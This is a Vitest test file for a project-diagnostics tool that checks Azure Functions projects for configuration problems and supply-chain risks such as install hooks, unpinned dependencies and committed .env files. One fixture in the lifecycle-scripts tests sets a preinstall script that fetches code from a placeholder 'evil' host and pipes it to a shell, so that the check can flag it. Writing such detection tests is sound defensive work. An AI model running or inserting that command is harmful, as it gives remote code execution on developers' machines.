import { describe, it, expect, afterAll } from 'vitest';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { spawnSync } from 'node:child_process';
import { createTempDir, removeDir } from './helpers/fs.js';
import { loadProjectContext } from '../src/doctor/context.js';
import {
  projectExistsCheck,
  runtimeVersionCheck,
  extensionBundleCheck,
  nodeVersionCheck,
  localSettingsCheck,
  connectionStringsCheck,
  deprecatedSettingsCheck,
  functionBindingsCheck,
  entryPointCheck,
  typescriptBuildCheck,
  lifecycleScriptsCheck,
  unpinnedProdDepsCheck,
  missingLockfileCheck,
  trackedSecretFilesCheck,
  installScriptDepsCheck,
  pythonUnpinnedRequirementsCheck,
  pythonMissingLockfileCheck,
  ALL_CHECKS,
} from '../src/doctor/checks.js';

const TEMP_DIRS: string[] = [];
function makeTmp(prefix: string): string {
  const dir = createTempDir(prefix);
  TEMP_DIRS.push(dir);
  return dir;
}
afterAll(() => { for (const d of TEMP_DIRS) removeDir(d); });

// ── Helper: scaffold a minimal project ──
function scaffoldProject(dir: string, opts?: {
  hostJson?: Record<string, unknown>;
  localSettings?: Record<string, unknown>;
  packageJson?: Record<string, unknown>;
  tsconfig?: Record<string, unknown>;
  functions?: Array<{ name: string; bindings: unknown[] }>;
  v4Functions?: Array<{ name: string; content: string }>;
}) {
  if (opts?.hostJson) writeFileSync(join(dir, 'host.json'), JSON.stringify(opts.hostJson));
  if (opts?.localSettings) writeFileSync(join(dir, 'local.settings.json'), JSON.stringify(opts.localSettings));
  if (opts?.packageJson) writeFileSync(join(dir, 'package.json'), JSON.stringify(opts.packageJson));
  if (opts?.tsconfig) writeFileSync(join(dir, 'tsconfig.json'), JSON.stringify(opts.tsconfig));
  if (opts?.functions) {
    for (const fn of opts.functions) {
      const fnDir = join(dir, fn.name);
      mkdirSync(fnDir, { recursive: true });
      writeFileSync(join(fnDir, 'function.json'), JSON.stringify({ bindings: fn.bindings }));
    }
  }
  if (opts?.v4Functions) {
    const srcDir = join(dir, 'src', 'functions');
    mkdirSync(srcDir, { recursive: true });
    for (const fn of opts.v4Functions) {
      writeFileSync(join(srcDir, `${fn.name}.ts`), fn.content);
    }
  }
}

// ── project-exists ──

describe('project-exists check', () => {
  it('passes when host.json exists', async () => {
    const dir = makeTmp('chk-proj-exist-');
    scaffoldProject(dir, { hostJson: { version: '2.0' } });
    const ctx = await loadProjectContext(dir);
    const results = await projectExistsCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('fails when host.json is missing', async () => {
    const dir = makeTmp('chk-proj-missing-');
    const ctx = await loadProjectContext(dir);
    const results = await projectExistsCheck.run(ctx);
    expect(results[0].status).toBe('fail');
    expect(results[0].severity).toBe('critical');
  });
});

// ── runtime-version ──

describe('runtime-version check', () => {
  it('passes with version "2.0"', async () => {
    const dir = makeTmp('chk-rt-ok-');
    scaffoldProject(dir, { hostJson: { version: '2.0' } });
    const ctx = await loadProjectContext(dir);
    const results = await runtimeVersionCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('fails with unsupported version', async () => {
    const dir = makeTmp('chk-rt-bad-');
    scaffoldProject(dir, { hostJson: { version: '1.0' } });
    const ctx = await loadProjectContext(dir);
    const results = await runtimeVersionCheck.run(ctx);
    expect(results[0].status).toBe('fail');
  });

  it('fails when version field is missing', async () => {
    const dir = makeTmp('chk-rt-no-ver-');
    scaffoldProject(dir, { hostJson: {} });
    const ctx = await loadProjectContext(dir);
    const results = await runtimeVersionCheck.run(ctx);
    expect(results[0].status).toBe('fail');
  });
});

// ── extension-bundle ──

describe('extension-bundle check', () => {
  it('passes with current version range', async () => {
    const dir = makeTmp('chk-ext-ok-');
    scaffoldProject(dir, {
      hostJson: {
        version: '2.0',
        extensionBundle: {
          id: 'Microsoft.Azure.Functions.ExtensionBundle',
          version: '[4.0.0, 5.0.0)',
        },
      },
      packageJson: { name: 'test' },
    });
    const ctx = await loadProjectContext(dir);
    const results = await extensionBundleCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('fails with outdated version range', async () => {
    const dir = makeTmp('chk-ext-old-');
    scaffoldProject(dir, {
      hostJson: {
        version: '2.0',
        extensionBundle: {
          id: 'Microsoft.Azure.Functions.ExtensionBundle',
          version: '[3.0.0, 4.0.0)',
        },
      },
      packageJson: { name: 'test' },
    });
    const ctx = await loadProjectContext(dir);
    const results = await extensionBundleCheck.run(ctx);
    expect(results[0].status).toBe('fail');
  });

  it('warns when extension bundle is not configured', async () => {
    const dir = makeTmp('chk-ext-none-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test' },
    });
    const ctx = await loadProjectContext(dir);
    const results = await extensionBundleCheck.run(ctx);
    expect(results[0].status).toBe('warn');
  });

  it('skips for dotnet projects', async () => {
    const dir = makeTmp('chk-ext-dotnet-');
    scaffoldProject(dir, { hostJson: { version: '2.0' } });
    writeFileSync(join(dir, 'MyFunc.csproj'), '<Project></Project>');
    const ctx = await loadProjectContext(dir);
    expect(extensionBundleCheck.appliesTo(ctx)).toBe(false);
  });
});

// ── node-version ──

describe('node-version check', () => {
  it('passes with supported version', async () => {
    const dir = makeTmp('chk-node-ok-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test', engines: { node: '>=22.0.0' } },
    });
    const ctx = await loadProjectContext(dir);
    const results = await nodeVersionCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('fails with unsupported version', async () => {
    const dir = makeTmp('chk-node-bad-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test', engines: { node: '>=14.0.0' } },
    });
    const ctx = await loadProjectContext(dir);
    const results = await nodeVersionCheck.run(ctx);
    expect(results[0].status).toBe('fail');
  });

  it('passes when engines.node is not specified', async () => {
    const dir = makeTmp('chk-node-noeng-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test' },
    });
    const ctx = await loadProjectContext(dir);
    const results = await nodeVersionCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });
});

// ── local-settings ──

describe('local-settings check', () => {
  it('passes with valid settings', async () => {
    const dir = makeTmp('chk-ls-ok-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      localSettings: { IsEncrypted: false, Values: { FUNCTIONS_WORKER_RUNTIME: 'node' } },
    });
    const ctx = await loadProjectContext(dir);
    const results = await localSettingsCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('warns when local.settings.json is missing', async () => {
    const dir = makeTmp('chk-ls-missing-');
    scaffoldProject(dir, { hostJson: { version: '2.0' } });
    const ctx = await loadProjectContext(dir);
    const results = await localSettingsCheck.run(ctx);
    expect(results[0].status).toBe('warn');
  });

  it('warns when FUNCTIONS_WORKER_RUNTIME is not set', async () => {
    const dir = makeTmp('chk-ls-no-runtime-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      localSettings: { IsEncrypted: false, Values: {} },
    });
    const ctx = await loadProjectContext(dir);
    const results = await localSettingsCheck.run(ctx);
    expect(results[0].status).toBe('warn');
  });
});

// ── connection-strings ──

describe('connection-strings check', () => {
  it('passes when no non-HTTP triggers and storage is not needed', async () => {
    const dir = makeTmp('chk-conn-ok-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      localSettings: { IsEncrypted: false, Values: { FUNCTIONS_WORKER_RUNTIME: 'node' } },
      functions: [{ name: 'HttpFunc', bindings: [{ type: 'httpTrigger', direction: 'in' }] }],
    });
    const ctx = await loadProjectContext(dir);
    const results = await connectionStringsCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('fails when non-HTTP trigger exists but AzureWebJobsStorage is missing', async () => {
    const dir = makeTmp('chk-conn-fail-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      localSettings: { IsEncrypted: false, Values: { FUNCTIONS_WORKER_RUNTIME: 'node' } },
      functions: [{ name: 'TimerFunc', bindings: [{ type: 'timerTrigger', direction: 'in' }] }],
    });
    const ctx = await loadProjectContext(dir);
    const results = await connectionStringsCheck.run(ctx);
    expect(results[0].status).toBe('fail');
    expect(results[0].message).toContain('AzureWebJobsStorage');
  });
});

// ── deprecated-settings ──

describe('deprecated-settings check', () => {
  it('passes when no deprecated settings', async () => {
    const dir = makeTmp('chk-dep-ok-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      localSettings: { IsEncrypted: false, Values: { FUNCTIONS_WORKER_RUNTIME: 'node' } },
    });
    const ctx = await loadProjectContext(dir);
    const results = await deprecatedSettingsCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('warns when deprecated setting is present', async () => {
    const dir = makeTmp('chk-dep-warn-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      localSettings: {
        IsEncrypted: false,
        Values: {
          FUNCTIONS_WORKER_RUNTIME: 'node',
          AzureWebJobsDashboard: 'somevalue',
        },
      },
    });
    const ctx = await loadProjectContext(dir);
    const results = await deprecatedSettingsCheck.run(ctx);
    expect(results.some(r => r.status === 'warn')).toBe(true);
    expect(results[0].title).toContain('AzureWebJobsDashboard');
  });
});

// ── function-bindings ──

describe('function-bindings check', () => {
  it('passes when all bindings are recognized', async () => {
    const dir = makeTmp('chk-bind-ok-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      functions: [{ name: 'HttpFunc', bindings: [{ type: 'httpTrigger', direction: 'in' }] }],
    });
    const ctx = await loadProjectContext(dir);
    const results = await functionBindingsCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });
});

// ── entry-point ──

describe('entry-point check', () => {
  it('passes when main field resolves', async () => {
    const dir = makeTmp('chk-entry-ok-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test', main: 'index.js' },
    });
    writeFileSync(join(dir, 'index.js'), 'module.exports = {};');
    const ctx = await loadProjectContext(dir);
    const results = await entryPointCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('fails when main field does not resolve', async () => {
    const dir = makeTmp('chk-entry-fail-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test', main: 'dist/src/index.js' },
    });
    const ctx = await loadProjectContext(dir);
    const results = await entryPointCheck.run(ctx);
    expect(results[0].status).toBe('fail');
  });
});

// ── typescript-build ──

describe('typescript-build check', () => {
  it('passes with outDir set', async () => {
    const dir = makeTmp('chk-ts-ok-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test' },
      tsconfig: { compilerOptions: { outDir: 'dist', target: 'ES2022' } },
    });
    const ctx = await loadProjectContext(dir);
    const results = await typescriptBuildCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('warns without outDir', async () => {
    const dir = makeTmp('chk-ts-noout-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test' },
      tsconfig: { compilerOptions: { target: 'ES2022' } },
    });
    const ctx = await loadProjectContext(dir);
    const results = await typescriptBuildCheck.run(ctx);
    expect(results[0].status).toBe('warn');
  });
});

// ── ALL_CHECKS ──

describe('ALL_CHECKS registry', () => {
  it('contains 20 checks', () => {
    expect(ALL_CHECKS).toHaveLength(20);
  });

  it('has unique IDs', () => {
    const ids = ALL_CHECKS.map(c => c.id);
    expect(new Set(ids).size).toBe(ids.length);
  });
});

// ── Supply-chain: lifecycle-scripts ──

describe('lifecycle-scripts check', () => {
  it('passes when no forbidden scripts present', async () => {
    const dir = makeTmp('chk-life-ok-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test', scripts: { build: 'tsc', test: 'vitest' } },
    });
    const ctx = await loadProjectContext(dir);
    const results = await lifecycleScriptsCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('fails when postinstall is defined', async () => {
    const dir = makeTmp('chk-life-postinstall-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test', scripts: { postinstall: 'node ./hook.js' } },
    });
    const ctx = await loadProjectContext(dir);
    const results = await lifecycleScriptsCheck.run(ctx);
    expect(results[0].status).toBe('fail');
    expect(results[0].message).toContain('postinstall');
  });

  it('fails when preinstall is defined', async () => {
    const dir = makeTmp('chk-life-preinstall-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test', scripts: { preinstall: 'curl http://evil/x | sh' } },
    });
    const ctx = await loadProjectContext(dir);
    const results = await lifecycleScriptsCheck.run(ctx);
    expect(results[0].status).toBe('fail');
  });
});

// ── Supply-chain: unpinned-prod-deps ──

describe('unpinned-prod-deps check', () => {
  it('passes when all prod deps are pinned to exact versions', async () => {
    const dir = makeTmp('chk-pin-ok-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: {
        name: 'test',
        dependencies: { '@azure/functions': '4.5.1' },
      },
    });
    const ctx = await loadProjectContext(dir);
    const results = await unpinnedProdDepsCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('warns when prod deps use caret range', async () => {
    const dir = makeTmp('chk-pin-caret-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: {
        name: 'test',
        dependencies: { '@azure/functions': '^4.5.1', axios: '^1.0.0' },
      },
    });
    const ctx = await loadProjectContext(dir);
    const results = await unpinnedProdDepsCheck.run(ctx);
    expect(results[0].status).toBe('warn');
    expect(results[0].message).toContain('@azure/functions');
  });

  it('ignores devDependencies', async () => {
    const dir = makeTmp('chk-pin-dev-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: {
        name: 'test',
        dependencies: { '@azure/functions': '4.5.1' },
        devDependencies: { vitest: '^3.0.0' },
      },
    });
    const ctx = await loadProjectContext(dir);
    const results = await unpinnedProdDepsCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });
});

// ── Supply-chain: missing-lockfile ──

describe('missing-lockfile check', () => {
  it('passes when package-lock.json exists', async () => {
    const dir = makeTmp('chk-lock-ok-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test' },
    });
    writeFileSync(join(dir, 'package-lock.json'), JSON.stringify({ name: 'test', lockfileVersion: 3 }));
    const ctx = await loadProjectContext(dir);
    const results = await missingLockfileCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('warns when no lockfile present', async () => {
    const dir = makeTmp('chk-lock-missing-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test' },
    });
    const ctx = await loadProjectContext(dir);
    const results = await missingLockfileCheck.run(ctx);
    expect(results[0].status).toBe('warn');
  });
});

// ── Supply-chain: tracked-secret-files ──

describe('tracked-secret-files check', () => {
  it('passes when no .env files exist', async () => {
    const dir = makeTmp('chk-secret-none-');
    scaffoldProject(dir, { hostJson: { version: '2.0' } });
    writeFileSync(join(dir, '.gitignore'), 'node_modules/\n');
    const ctx = await loadProjectContext(dir);
    const results = await trackedSecretFilesCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('fails when .env exists and is not gitignored', async () => {
    const dir = makeTmp('chk-secret-untracked-');
    scaffoldProject(dir, { hostJson: { version: '2.0' } });
    writeFileSync(join(dir, '.env'), 'SECRET=topsecret\n');
    writeFileSync(join(dir, '.gitignore'), 'node_modules/\n');
    const ctx = await loadProjectContext(dir);
    const results = await trackedSecretFilesCheck.run(ctx);
    expect(results[0].status).toBe('fail');
    expect(results[0].severity).toBe('high');
  });

  it('passes when .env exists but is gitignored via wildcard', async () => {
    const dir = makeTmp('chk-secret-ignored-');
    scaffoldProject(dir, { hostJson: { version: '2.0' } });
    writeFileSync(join(dir, '.env'), 'SECRET=topsecret\n');
    writeFileSync(join(dir, '.gitignore'), 'node_modules/\n.env*\n');
    const ctx = await loadProjectContext(dir);
    const results = await trackedSecretFilesCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('fails when .env is actually tracked by git, even if .gitignore now covers it', async () => {
    // The highest-risk case: secret was committed to git, then later added
    // to .gitignore. Reading .gitignore alone misses it. The check must
    // consult the git index.
    const dir = makeTmp('chk-secret-tracked-');
    scaffoldProject(dir, { hostJson: { version: '2.0' } });
    writeFileSync(join(dir, '.env'), 'SECRET=topsecret\n');

    // Init a git repo and commit the .env file BEFORE writing .gitignore
    initGit(dir);
    addAndCommit(dir, '.env');

    // Now add .gitignore that would cover .env going forward
    writeFileSync(join(dir, '.gitignore'), 'node_modules/\n.env*\n');

    const ctx = await loadProjectContext(dir);
    const results = await trackedSecretFilesCheck.run(ctx);
    expect(results[0].status).toBe('fail');
    expect(results[0].message.toLowerCase()).toMatch(/tracked|committed|git/);
  });

  it('passes when .env is gitignored AND not tracked by git', async () => {
    const dir = makeTmp('chk-secret-clean-');
    scaffoldProject(dir, { hostJson: { version: '2.0' } });

    // git init first, gitignore in place, then write .env (untracked)
    writeFileSync(join(dir, '.gitignore'), 'node_modules/\n.env*\n');
    initGit(dir);
    addAndCommit(dir, '.gitignore');

    writeFileSync(join(dir, '.env'), 'SECRET=topsecret\n');

    const ctx = await loadProjectContext(dir);
    const results = await trackedSecretFilesCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });
});

function initGit(dir: string) {
  // Allow tests to skip if git is not on PATH
  const r = spawnSync('git', ['init', '-q'], { cwd: dir, shell: process.platform === 'win32' });
  if (r.status !== 0) throw new Error('git init failed (is git on PATH?)');
  spawnSync('git', ['config', 'user.email', 'test@example.com'], { cwd: dir, shell: process.platform === 'win32' });
  spawnSync('git', ['config', 'user.name', 'Test'], { cwd: dir, shell: process.platform === 'win32' });
}

function addAndCommit(dir: string, file: string) {
  spawnSync('git', ['add', file], { cwd: dir, shell: process.platform === 'win32' });
  spawnSync('git', ['commit', '-q', '-m', `add ${file}`], { cwd: dir, shell: process.platform === 'win32' });
}

// ── Supply-chain: install-script-deps ──

describe('install-script-deps check', () => {
  it('skips when node_modules absent', async () => {
    const dir = makeTmp('chk-inst-skip-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test', dependencies: { axios: '1.0.0' } },
    });
    const ctx = await loadProjectContext(dir);
    const results = await installScriptDepsCheck.run(ctx);
    expect(results[0].status).toBe('skip');
  });

  it('warns when a dep has postinstall', async () => {
    const dir = makeTmp('chk-inst-warn-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test', dependencies: { 'fake-dep': '1.0.0' } },
    });
    const depDir = join(dir, 'node_modules', 'fake-dep');
    mkdirSync(depDir, { recursive: true });
    writeFileSync(join(depDir, 'package.json'), JSON.stringify({
      name: 'fake-dep',
      version: '1.0.0',
      scripts: { postinstall: 'node ./hook.js' },
    }));
    const ctx = await loadProjectContext(dir);
    const results = await installScriptDepsCheck.run(ctx);
    expect(results[0].status).toBe('warn');
    expect(results[0].message).toContain('fake-dep');
  });

  it('passes when allowlisted native deps have install scripts (sharp)', async () => {
    const dir = makeTmp('chk-inst-allow-');
    scaffoldProject(dir, {
      hostJson: { version: '2.0' },
      packageJson: { name: 'test', dependencies: { sharp: '0.33.0' } },
    });
    const depDir = join(dir, 'node_modules', 'sharp');
    mkdirSync(depDir, { recursive: true });
    writeFileSync(join(depDir, 'package.json'), JSON.stringify({
      name: 'sharp',
      version: '0.33.0',
      scripts: { install: 'node install/check' },
    }));
    const ctx = await loadProjectContext(dir);
    const results = await installScriptDepsCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });
});

// ── Supply-chain (Python): unpinned-requirements ──

describe('python-unpinned-requirements check', () => {
  it('skips when not a python project', async () => {
    const dir = makeTmp('chk-pyunpin-skip-');
    scaffoldProject(dir, { hostJson: { version: '2.0' }, packageJson: { name: 'n' } });
    const ctx = await loadProjectContext(dir);
    const results = await pythonUnpinnedRequirementsCheck.run(ctx);
    expect(results[0].status).toBe('skip');
  });

  it('passes when requirements.txt pins every package', async () => {
    const dir = makeTmp('chk-pyunpin-ok-');
    writeFileSync(join(dir, 'host.json'), JSON.stringify({ version: '2.0' }));
    writeFileSync(join(dir, 'requirements.txt'), 'azure-functions==1.18.0\nrequests==2.31.0\n');
    const ctx = await loadProjectContext(dir);
    const results = await pythonUnpinnedRequirementsCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('warns when requirements.txt has unpinned packages', async () => {
    const dir = makeTmp('chk-pyunpin-bad-');
    writeFileSync(join(dir, 'host.json'), JSON.stringify({ version: '2.0' }));
    writeFileSync(
      join(dir, 'requirements.txt'),
      'azure-functions\nrequests>=2.0\nflask~=2.3\n# comment\n'
    );
    const ctx = await loadProjectContext(dir);
    const results = await pythonUnpinnedRequirementsCheck.run(ctx);
    expect(results[0].status).toBe('warn');
    expect(results[0].message).toContain('azure-functions');
  });
});

// ── Supply-chain (Python): missing-lockfile ──

describe('python-missing-lockfile check', () => {
  it('skips when not a python project', async () => {
    const dir = makeTmp('chk-pylock-skip-');
    scaffoldProject(dir, { hostJson: { version: '2.0' }, packageJson: { name: 'n' } });
    const ctx = await loadProjectContext(dir);
    const results = await pythonMissingLockfileCheck.run(ctx);
    expect(results[0].status).toBe('skip');
  });

  it('warns when no python lockfile is present', async () => {
    const dir = makeTmp('chk-pylock-warn-');
    writeFileSync(join(dir, 'host.json'), JSON.stringify({ version: '2.0' }));
    writeFileSync(join(dir, 'requirements.txt'), 'azure-functions==1.18.0\n');
    const ctx = await loadProjectContext(dir);
    const results = await pythonMissingLockfileCheck.run(ctx);
    expect(results[0].status).toBe('warn');
  });

  it('passes when requirements.txt uses --hash for every dep', async () => {
    const dir = makeTmp('chk-pylock-hash-');
    writeFileSync(join(dir, 'host.json'), JSON.stringify({ version: '2.0' }));
    writeFileSync(
      join(dir, 'requirements.txt'),
      'azure-functions==1.18.0 --hash=sha256:abc\nrequests==2.31.0 --hash=sha256:def\n'
    );
    const ctx = await loadProjectContext(dir);
    const results = await pythonMissingLockfileCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });

  it('passes when poetry.lock is present', async () => {
    const dir = makeTmp('chk-pylock-poetry-');
    writeFileSync(join(dir, 'host.json'), JSON.stringify({ version: '2.0' }));
    writeFileSync(join(dir, 'requirements.txt'), 'azure-functions==1.18.0\n');
    writeFileSync(join(dir, 'poetry.lock'), '# poetry lock\n');
    const ctx = await loadProjectContext(dir);
    const results = await pythonMissingLockfileCheck.run(ctx);
    expect(results[0].status).toBe('pass');
  });
});
